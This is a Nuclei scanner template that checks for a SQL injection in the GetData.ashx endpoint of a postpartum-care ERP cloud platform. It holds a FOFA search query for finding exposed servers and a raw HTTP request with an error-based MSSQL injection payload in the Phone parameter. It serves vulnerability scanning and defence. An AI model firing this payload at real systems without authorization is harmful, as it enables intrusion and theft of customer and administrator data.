id: yueziERP-GetData_ashx-sql

info:
  name: 月子会所ERP管理云平台 GetData.ashx 接口SQL注入漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
    月子会所ERP管理云平台的 GetData.ashx 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过身份验证机制，直接访问后端数据库，提取敏感数据（如管理员凭证、用户隐私信息）。在具备高权限访问条件下，攻击者可进一步执行任意代码，实现服务器端Web Shell部署，从而完全控制目标系统。
  reference:
  - https://mp.weixin.qq.com/s/ylFoQcI5NxL4gnmhXuwddw?token=1451506197&lang=zh_CN
  tags: 月子会所ERP管理云平台


http:
- raw:
  - |
    GET /Page/BasicInfo/ashx/GetData.ashx?ChannelId=&ClientName=1&FitemId=null&Phone=1%27+AND+4798+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284798%3D4798%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--+uTFu&RequestMethod=ApplyActivity&SaleId= HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'qvqzq1qkxbq'
  - type: status
    status:
    - 500
